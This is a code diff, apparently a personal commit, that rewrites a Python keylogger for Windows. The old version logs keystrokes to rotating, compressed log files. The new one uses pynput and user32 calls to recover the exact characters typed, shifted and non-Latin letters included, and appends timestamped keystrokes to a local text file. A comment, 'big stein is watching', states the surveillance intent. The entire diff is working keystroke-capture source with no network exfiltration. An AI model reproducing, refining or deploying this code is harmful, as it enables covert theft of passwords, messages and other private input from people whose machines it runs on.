@@ -1,109 +1,105 @@
-import os
-import logging
+import pynput.keyboard as keyboard
+import ctypes
 import time
-import shutil
-from pynput import keyboard
-from datetime import datetime
-import threading
 
-# Configuration
-LOG_FILE_SIZE_LIMIT = 5 * 1024 * 1024  # 5MB limit for each log file
-LOG_DIR = "logs"  # Directory where logs will be saved
-COMPRESS_LOGS = True  # Whether to compress old logs into .zip files
-LOG_RESET_INTERVAL = 3600  # Log reset interval in seconds (1 hour is the dfefault)
+#big stein is watching 
 
-if not os.path.exists(LOG_DIR):
-    os.makedirs(LOG_DIR)
+log_name = "captured_keys.txt"
+u32 = ctypes.windll.user32 # shortenin this so i dont have to type it every time
 
-def get_new_log_filename():
-    """Generate a new log file name with a timestamp."""
-    timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
-    return os.path.join(LOG_DIR, f"keylog_{timestamp}.txt")
-log_filename = get_new_log_filename()
-logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s", encoding='utf-8')
+def save_it(data):
+    # Need utf-8 here otherwise the Greek letters turn into gibberish type shi
+    with open(log_name, "a", encoding="utf-8") as file:
+        file.write(data)
 
-pressed_keys = set()
+def get_real_char(vk, shift, caps):
+    hwnd = u32.GetForegroundWindow()
+    pid = u32.GetWindowThreadProcessId(hwnd, 0)
+    layout = u32.GetKeyboardLayout(pid)
+    kb_state = (ctypes.c_uint8 * 256)()
+    u32.GetKeyboardState(kb_state)
+    
+    # force shift and caps lock state bla bla bla (baal knowledge)
+    if shift:
+        kb_state[0x10] = 0x80 # VK_SHIFT
+    else:
+        kb_state[0x10] = 0x00
+        
+    if caps:
+        kb_state[0x14] = 0x01 # VK_CAPITAL
+    else:
+        kb_state[0x14] = 0x00
 
+    scan = u32.MapVirtualKeyExW(vk, 0, layout)
+    buf = ctypes.create_unicode_buffer(8)
+    res = u32.ToUnicodeEx(vk, scan, kb_state, buf, 8, 0, layout)
+    if res > 0:
+        return buf.value
+    return None
+  
 def on_press(key):
+    t = time.strftime("%H:%M:%S")
+    
     try:
-        if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-            pressed_keys.add('ctrl')
-        elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
-            pressed_keys.add('shift')
-        elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
-            pressed_keys.add('alt')
-        else:
-            if 'ctrl' in pressed_keys:
-                # FIX FOR CTRL+KEY ERROR: Try to get the vk to find the actual letter
-                if hasattr(key, 'vk') and 96 < key.vk < 123: # a-z range
-                     char = chr(key.vk).upper()
-                elif hasattr(key, 'char'):
-                     # If char is a low ASCII control code (1-26), map it back to a-z
-                     if ord(key.char) <= 26:
-                         char = chr(ord(key.char) + 64) # 1 becomes 'A'
-                     else:
-                         char = key.char
+        # check if control is held
+        ctrl = (u32.GetAsyncKeyState(0x11) & 0x8000) != 0
+
+        # skip modifier keys so the text file isnt full of them
+        if key == keyboard.Key.shift or key == keyboard.Key.shift_r or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.caps_lock:
+            return
+        # handle other special keys like enter, space, etc
+        if isinstance(key, keyboard.Key):
+            save_it(f"[{t}] [{key.name}]\n")
+            print(f"[{key.name}]") 
+            return
+        vk_code = None
+        if hasattr(key, 'vk') and key.vk != None:
+            vk_code = key.vk
+        elif hasattr(key, 'value') and hasattr(key.value, 'vk'):
+            vk_code = key.value.vk
+        
+        if vk_code != None:
+            if ctrl:
+                # CTRL + whatever
+                if 65 <= vk_code <= 90:
+                    letter = chr(vk_code)
                 else:
-                     char = str(key)
-                
-                logging.info(f"Ctrl + {char} pressed")
-            
-            elif 'shift' in pressed_keys and key == keyboard.Key.enter:
-                logging.info("Shift + Enter pressed")
+                    letter = str(vk_code)
+                out = f"[CTRL+{letter}]"
             else:
-                logging.info(f"Key pressed: {key.char if hasattr(key, 'char') else key}")
+                # check real hardware states for shift and caps
+                shift_down = (u32.GetAsyncKeyState(0x10) & 0x8000) != 0
+                caps_on = (u32.GetKeyState(0x14) & 0x0001) != 0
+                
+                real_char = get_real_char(vk_code, shift_down, caps_on)
+                
+                if real_char != None:
+                    # Universal XOR logic for all letters
+                    if real_char.isalpha():
+                        if caps_on ^ shift_down:
+                            out = real_char.upper()
+                        else:
+                            out = real_char.lower()
+                    else:
+                        # numbers or symbols
+                        out = real_char
+                else:
+                    out = f"[{vk_code}]"
+            save_it(f"[{t}] {out}\n")
+            print(out)
 
-    except AttributeError:
-        logging.info(f"Special key pressed: {key}")
     except Exception as e:
-        logging.error(f"Error logging key: {e}")
-
-    # Check if the log file exceeds the size limit
-    if os.path.getsize(log_filename) > LOG_FILE_SIZE_LIMIT:
-        logging.info(f"Log file exceeded 5MB, creating a new log file.")
-        rotate_logs()
+        print("error:", e)
+        save_it(f"[{t}] [error]\n")
 
 def on_release(key):
-    """Stops the listener when the escape key is pressed and removes the modifier keys."""
     if key == keyboard.Key.esc:
-        logging.info("Keylogger stopped.")
+        print("stopping...")
         return False
-    if key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
-        pressed_keys.discard('ctrl')
-    elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
-        pressed_keys.discard('shift')
-    elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
-        pressed_keys.discard('alt')
 
-def rotate_logs():
-    """Handles log file rotation and compression."""
-    global log_filename
-    if COMPRESS_LOGS:
-        compress_log(log_filename)
+if __name__ == "__main__":
+    print("Starting logger... press esc to stop")
+    with keyboard.Listener(on_press=on_press, on_release=on_release) as l:
+        l.join()
 
-    # Create a new log file
-    log_filename = get_new_log_filename()
-    logging.basicConfig(filename=log_filename, level=logging.DEBUG, format="%(asctime)s - %(message)s")
-    logging.info("Starting new log file.")
-
-def compress_log(filename):
-    """Compress the log file into a .zip archive."""
-    compressed_filename = filename + ".zip"
-    shutil.make_archive(compressed_filename, 'zip', LOG_DIR, filename)
-    os.remove(filename)
-    print(f"Compressed and removed {filename}")
-
-def periodic_reset():
-    """Periodically resets the log file."""
-    while True:
-        time.sleep(LOG_RESET_INTERVAL)
-        rotate_logs()
-        logging.info("Log file reset.")
-
-reset_thread = threading.Thread(target=periodic_reset, daemon=True)
-reset_thread.start()
-logging.info("Keylogger started.")
-
-# Set up the listener to monitor keyboard input
-with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+# megas alekasndros IQ room temperature type shi 
